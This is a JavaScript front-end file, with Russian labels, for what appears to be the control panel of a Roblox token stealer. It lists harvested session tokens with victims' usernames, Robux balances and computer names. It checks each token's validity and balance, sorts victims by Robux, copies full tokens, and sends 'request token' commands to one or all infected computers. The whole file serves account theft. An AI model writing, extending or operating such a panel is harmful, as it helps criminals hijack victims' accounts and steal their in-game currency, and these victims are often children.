// ── Страница токенов ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('headerSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date';

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  container.innerHTML = '<div class="loading">⏳ Загрузка...</div>';
  try {
    const r = await apiFetch('/tokens-data');
    allTokens = await r.json();
    if (!Array.isArray(allTokens)) allTokens = [];
    updateStats();
    renderTokens();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки токенов', 'err');
    }
  }
}

function updateStats() {
  const total = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.valid && t.robux ? t.robux : 0), 0);
  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = valid;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
}

function renderTokens() {
  const container = document.getElementById('tokensContainer');

  if (allTokens.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>База токенов пуста</div>';
    return;
  }

  let list = [...allTokens];
  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = (a.valid && a.robux) ? a.robux : -1;
      const br = (b.valid && a.robux) ? b.robux : -1;
      return br - ar;
    });
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  let html = '<table class="tokens-table"><thead><tr>';
  html += '<th>Статус</th>';
  html += '<th>Ник</th>';
  html += '<th>Robux</th>';
  html += '<th>Токен</th>';
  html += '<th>Компьютер</th>';
  html += '<th>Действия</th>';
  html += '</tr></thead><tbody>';

  for (const t of list) {
    const valid = t.valid;
    const robux = valid && t.robux !== null ? t.robux : null;
    const rowClass = valid ? '' : 'invalid';
    const statusBadge = valid
      ? '<span class="badge badge-valid">✅ Рабочий</span>'
      : '<span class="badge badge-invalid">❌ ' + escapeHtml(t.error || 'Невалид') + '</span>';
    const robuxDisplay = valid
      ? '<span class="robux">' + (robux !== null ? robux.toLocaleString() + ' R$' : '?') + '</span>'
      : '<span class="robux invalid">—</span>';
    const nick = escapeHtml(t.username || t.user || '—');
    const computer = escapeHtml(t.computer || '—');
    const tokenShort = t.security ? escapeHtml(t.security.substring(0, 30)) + '...' : '—';
    const tokenFull = escapeHtml(t.security || '');
    const fileId = escapeHtml(t.file || '');

    html += '<tr class="' + rowClass + '" id="row-' + fileId + '">';
    html += '<td>' + statusBadge + '</td>';
    html += '<td style="font-weight:600;">' + nick + '</td>';
    html += '<td>' + robuxDisplay + '</td>';
    html += '<td><div class="token-cell" title="' + tokenFull + '">' + tokenShort + '</div></td>';
    html += '<td style="font-size:0.78rem;">' + computer + '</td>';
    html += '<td><div style="display:flex; gap:6px; flex-wrap:wrap;">';
    html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">💰 Проверить</button>';
    html += '<button class="copy-btn" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem; border-color:rgba(99,102,241,0.2); color:var(--accent);">📡 Запросить</button>';
    if (t.security) {
      html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">📋 Копировать</button>';
    }
    html += '</div></td>';
    html += '</tr>';
  }

  html += '</tbody></table>';
  container.innerHTML = html;
}

// ── Проверить один токен ──────────────────────────────────────────────────────
async function checkSingle(filename) {
  toast('⏳ Проверка...');
  try {
    const r = await apiFetch('/robux-check-file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    const info = await r.json();
    // Обновляем локальные данные
    const idx = allTokens.findIndex(t => t.file === filename);
    if (idx >= 0) {
      allTokens[idx] = { ...allTokens[idx], ...info };
      updateStats();
      renderTokens();
    }
    if (info.valid) {
      toast('💰 ' + (info.robux ? info.robux.toLocaleString() + ' R$' : 'OK'));
    } else {
      toast('❌ ' + (info.error || 'Невалид'), 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }
}

// ── Запросить токен у одного компьютера ───────────────────────────────────────
async function requestToken(filename) {
  toast('📡 Запрос отправлен...');
  try {
    await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    toast('📡 Запрос токена отправлен компьютеру');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
  }
}

// ── Запросить токен у всех ────────────────────────────────────────────────────
document.getElementById('btnRequestAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  btn.textContent = '⏳ Отправка...';
  try {
    const r = await apiFetch('/request-token-all', { method: 'POST' });
    const data = await r.json();
    toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
  }
  btn.disabled = false;
  btn.textContent = '📡 Запросить у всех';
});

// ── Проверить все ─────────────────────────────────────────────────────────────
document.getElementById('btnCheckAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  btn.textContent = '⏳ Проверка...';
  try {
    const r = await apiFetch('/robux-bulk', { method: 'POST' });
    const results = await r.json();
    if (Array.isArray(results)) {
      allTokens = results;
      updateStats();
      renderTokens();
      const valid = results.filter(r => r.valid).length;
      toast('✅ Проверено: ' + valid + '/' + results.length + ' рабочих');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }
  btn.disabled = false;
  btn.textContent = '✓ Проверить все';
});

// ── Копирование ───────────────────────────────────────────────────────────────
function copyText(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => toast('📋 Скопировано')).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    toast('📋 Скопировано');
  });
}

// ── Сортировка ────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate').addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux').addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  renderTokens();
});

loadTokens();
